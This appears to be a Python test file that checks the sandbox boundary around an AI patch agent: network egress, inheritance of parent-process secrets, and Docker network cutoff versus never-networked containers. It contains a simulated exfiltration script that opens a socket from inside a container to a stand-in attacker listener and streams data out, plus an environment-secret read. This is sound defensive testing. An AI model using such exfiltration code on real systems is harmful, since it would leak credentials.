"""B97: the patch agent's execution context, and the container boundary around it.

`sync.remediate.tool_gate` narrows what the agent may *ask for*. It is not an
operating-system boundary and says so in its own module docstring. This file
proves the gap concretely, on this host, rather than asserting it from a
configuration file:

- `test_patch_agent_execution_context_reaches_arbitrary_host_today` and
  `test_patch_agent_execution_context_inherits_the_full_parent_environment_today`
  reproduce the shape of the subprocess `ClaudeAgentOptions` puts the CLI in
  today -- `cwd` inside a throwaway clone, no `env=`, no `sandbox` -- and show
  it can open a socket to a host Sync never named, carrying whatever secret the
  parent process holds. Both are RED: they demonstrate a real, present gap.

- `test_container_network_cutoff_blocks_arbitrary_egress` proves the mechanism
  this entry needs is real on this host's actual Docker Desktop/WSL2 backend: a
  running Linux container loses its route the moment `docker network
  disconnect` returns, with a positive control so the test cannot pass because
  the harness itself has no route. `sync.remediate.sandbox` is the module this
  test is proving.

- `test_disconnect_network_does_not_stop_an_already_open_socket` is the
  adversarial review's follow-up finding, dated 2026-08-16: the cutoff above
  is real for a *new* connection attempt and does nothing for a socket that
  was already open and sending before `disconnect_network` was called. This
  stays green permanently -- it characterizes a real, measured limitation of
  that primitive, not a bug awaiting a fix inside it (two in-place fixes,
  `ss -K` and `conntrack -F`, were tried by hand against this host's actual
  Docker Desktop/WSL2 kernel and neither closes the window; see
  `sync.remediate.sandbox`'s module docstring for what was tried and why both
  failed).

- `test_never_networked_container_receives_nothing_after_install_container_is_torn_down`
  is the structural fix this file's previous finding forced: rather than
  disconnecting a live container's network out from under a process that keeps
  running, the risky phase's container is destroyed outright and the safe
  phase runs in a second container that was never attached to a network at
  all, so there is no cutover moment for a socket to survive. Proves both
  halves -- the artifact the risky phase produced reaches the safe container,
  and nothing sent by the (now-dead) risky-phase process arrives after its
  container's teardown completes.

Requires a working Docker Desktop with Linux containers -- the same local
toolchain dependency this suite already has on the Postgres container.
"""

from __future__ import annotations

import os
import socket
import subprocess
import sys
import threading
import time

import pytest

# A public resolver, not a vendor Sync integrates with -- this proves a raw
# socket can leave the process, not that any vendor API answered.
_ARBITRARY_HOST = ("1.1.1.1", 443)
_FAKE_SECRET = "sk-not-a-real-credential-b97-red-test"

# The image every test below runs the containers under test against.
_TEST_IMAGE = "python:3.12-slim"

# `docker exec` timeouts for the small, fast operations these tests issue --
# not `sandbox._DOCKER_TIMEOUT_SECONDS`, which is sized for a real install.
_EXEC_TIMEOUT_SECONDS = 15


def _run_docker(*args: str, timeout: float = _EXEC_TIMEOUT_SECONDS) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", *args],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=timeout,
    )


def _start_attacker_listener() -> tuple[socket.socket, int, dict[str, int], threading.Event]:
    """A plain TCP server standing in for the attacker-controlled endpoint the
    threat model describes -- a real socket accepting a real connection over
    Docker's real network stack, reached from inside a container via `docker
    exec`'s own view of `host.docker.internal` rather than anything mocked.

    Returns `(server_socket, port, received, stop)`. `received["bytes"]` is
    updated by a background thread as data arrives, so a test can watch it
    grow (or stop growing) without blocking its own control flow on `recv`.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 0))
    server.listen(1)
    port = server.getsockname()[1]
    received = {"bytes": 0}
    stop = threading.Event()

    def _drain() -> None:
        server.settimeout(10)
        try:
            conn, _addr = server.accept()
        except OSError:
            return
        conn.settimeout(0.5)
        while not stop.is_set():
            try:
                chunk = conn.recv(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            if not chunk:
                break
            received["bytes"] += len(chunk)
        conn.close()

    thread = threading.Thread(target=_drain, daemon=True)
    thread.start()
    return server, port, received, stop


def _exfiltrate_in_background(container, port: int) -> None:
    """Start a process inside `container` that connects to the listener on the
    host at `port` and sends continuously until the socket refuses a write --
    the exact shape the review's attack takes: code running during dependency
    install opens one outbound socket and keeps writing to it.
    """
    script = (
        "import socket, time\n"
        f"s = socket.create_connection(('host.docker.internal', {port}), timeout=5)\n"
        "while True:\n"
        "    try:\n"
        "        s.sendall(b'x' * 1024)\n"
        "    except Exception:\n"
        "        break\n"
        "    time.sleep(0.02)\n"
    )
    result = _run_docker("exec", "-d", container.id, "python3", "-c", script)
    assert result.returncode == 0, f"failed to start the exfiltration process: {result.stderr}"


def test_patch_agent_execution_context_reaches_arbitrary_host_today(tmp_path):
    """RED for B97: today's execution context has no network boundary.

    Reproduces the shape of the subprocess the patch agent's CLI runs in --
    same cwd-inside-clone, same inherited `os.environ`, no container, no
    network cutoff -- and shows it can open a socket to an arbitrary host.
    Run against a real external address so it demonstrates an actual open
    socket rather than an assumption about the platform.
    """
    result = subprocess.run(
        [
            sys.executable, "-c",
            "import socket; socket.create_connection(('1.1.1.1', 443), timeout=5); "
            "print('CONNECTED')",
        ],
        cwd=tmp_path,
        env=os.environ.copy(),
        capture_output=True,
        text=True,
        encoding="utf-8",
        timeout=15,
    )
    assert "CONNECTED" in result.stdout


def test_patch_agent_execution_context_inherits_the_full_parent_environment_today(tmp_path):
    """RED for B97: today's execution context carries every credential the
    control plane holds, not only the ones the patch needs.

    `AgentRemediator._drive_agent` builds `ClaudeAgentOptions` with no `env=`
    argument, so the CLI subprocess it spawns inherits `os.environ` in full --
    `SYNC_GRAPH_DSN`, a webhook secret, a feed-signing key, all reachable from
    inside the clone's `Bash` today. This reproduces that inheritance directly
    rather than asserting it from reading the constructor call.
    """
    env = {**os.environ, "SYNC_GRAPH_DSN": _FAKE_SECRET}
    result = subprocess.run(
        [sys.executable, "-c", "import os; print(os.environ.get('SYNC_GRAPH_DSN', ''))"],
        cwd=tmp_path,
        env=env,
        capture_output=True,
        text=True,
        encoding="utf-8",
        timeout=15,
    )
    assert result.stdout.strip() == _FAKE_SECRET


@pytest.mark.docker
def test_container_network_cutoff_blocks_arbitrary_egress():
    """GREEN for B97's close condition, against a real running container.

    Not a mocked Docker client and not an assertion about `--network` flags in
    a compose file -- this is evidence about what this machine's Docker
    Desktop/WSL2 backend actually enforces, which is exactly what the backlog
    entry demands and exactly what a configuration file cannot provide.

    Positive control first: the harness itself proves it can reach the
    network before the cutoff, so a later failure means the cutoff worked,
    not that Docker Desktop lacks a route to begin with -- the same anti-
    pattern CLAUDE.md calls out for the import-boundary test.

    Imported lazily: this test's own existence must not block collection of
    the two RED tests above on a host where `sync.remediate.sandbox` does
    not exist yet.
    """
    from sync.remediate import sandbox

    with sandbox.ephemeral_container(image="python:3.12-slim") as container:
        before = sandbox.probe_connect(container, "1.1.1.1", 443)
        assert before.reachable, f"positive control failed: {before.detail}"

        sandbox.disconnect_network(container)

        after = sandbox.probe_connect(container, "1.1.1.1", 443)
        assert not after.reachable, "expected the disconnect to block egress, but it did not"


@pytest.mark.docker
def test_disconnect_network_does_not_stop_an_already_open_socket():
    """The adversarial review's finding, dated 2026-08-16, characterized directly:
    `disconnect_network` removes future routing and does nothing to a connection
    that was already open and actively sending when it was called.

    The review measured 0.92-1.5s of continued delivery after `docker network
    disconnect` returned, against a real listener. Wall-clock timing is not a
    property this suite can pin without becoming flaky on a loaded CI host, so
    this asserts the same shape instead: a positive control proves data was
    flowing before the call, and a generous wait *after* the call returns --
    several times the review's measured window -- still finds the byte count
    higher than it was the moment the call returned. If this test ever goes
    red, `disconnect_network` closed the gap by itself and this file's
    characterization of it is stale, not the fix.

    This test is expected to stay green forever; it is not a RED test awaiting
    a fix inside `disconnect_network` itself.
    `test_never_networked_container_receives_nothing_after_install_container_is_torn_down`
    below is the fix, and it does not touch this function.
    """
    from sync.remediate import sandbox

    server, port, received, stop = _start_attacker_listener()
    try:
        with sandbox.ephemeral_container(image=_TEST_IMAGE) as container:
            _exfiltrate_in_background(container, port)
            time.sleep(0.5)
            before = received["bytes"]
            assert before > 0, "positive control failed: no data reached the listener before disconnect"

            sandbox.disconnect_network(container)
            at_return = received["bytes"]

        assert at_return > before, (
            "expected more data to have arrived by the time disconnect_network() "
            "returned than had arrived before it was called -- that is the gap "
            "this test characterizes: the call itself blocks for the better part "
            "of a second (the review measured 0.92-1.5s) while the already-open "
            "socket keeps delivering. If this now holds steady, disconnect_network "
            "changed and this test needs to be revisited."
        )
    finally:
        stop.set()
        server.close()


@pytest.mark.docker
def test_never_networked_container_receives_nothing_after_install_container_is_torn_down():
    """GREEN for B97's structural fix, proven against real containers.

    The risky (networked) phase and the safe (patch/verify) phase never share
    a container's lifetime: the risky phase's container is destroyed outright
    -- not disconnected -- once its output is copied out, and the safe phase's
    container is created with `network="none"` from the start, so it never had
    a route to lose. There is no cutover moment for the earlier test's gap to
    live in.

    Two things are proven, not one:

    1. The artifact the risky phase produced (`copy_between_containers`)
       reaches the safe container, so the fix is not merely "no more leaks" by
       way of "no more artifacts either."
    2. After the risky-phase container's teardown completes -- the same
       `docker rm -f` `ephemeral_container` already runs on `__exit__`, not a
       new mechanism invented for this test -- nothing more sent by its
       (now-dead) exfiltration process ever reaches the listener. Not "the
       socket errors eventually": the byte count is pinned immediately after
       teardown and re-checked after a wait several times longer than the
       previous test's window, and it must not have moved.
    """
    from sync.remediate import sandbox

    server, port, received, stop = _start_attacker_listener()
    try:
        with sandbox.ephemeral_container(image=_TEST_IMAGE) as install_container:
            mkdir = _run_docker("exec", install_container.id, "mkdir", "-p", "/workspace/artifact")
            assert mkdir.returncode == 0, mkdir.stderr
            write = _run_docker(
                "exec", install_container.id, "sh", "-c",
                "echo installed-artifact > /workspace/artifact/payload.txt",
            )
            assert write.returncode == 0, write.stderr

            _exfiltrate_in_background(install_container, port)
            time.sleep(0.5)
            before = received["bytes"]
            assert before > 0, "positive control failed: no data reached the listener before teardown"

            with sandbox.ephemeral_container(image=_TEST_IMAGE, network="none") as patch_container:
                sandbox.copy_between_containers(install_container, patch_container, "/workspace/artifact")

                never_reachable = sandbox.probe_connect(patch_container, "host.docker.internal", port)
                assert not never_reachable.reachable, (
                    "the patch container was created with no network and must never "
                    f"reach the listener: {never_reachable.detail}"
                )

                read_back = _run_docker(
                    "exec", patch_container.id, "cat", "/workspace/artifact/payload.txt",
                )
                assert read_back.stdout.strip() == "installed-artifact"
            # patch_container torn down here; the install container is still alive
            # and still exfiltrating -- the property under test is about the
            # install container's own teardown below, not this one's.

        # install_container's `docker rm -f` has now completed (ephemeral_container's
        # own `finally`), which is the cutoff this test declares done.
        at_teardown = received["bytes"]
        time.sleep(2)  # several times the earlier test's window, on the same gap
        after_wait = received["bytes"]

        assert after_wait == at_teardown, (
            "expected zero bytes after the install container's teardown completed; "
            f"received {after_wait - at_teardown} more, meaning the structural fix "
            "did not close the window"
        )
    finally:
        stop.set()
        server.close()
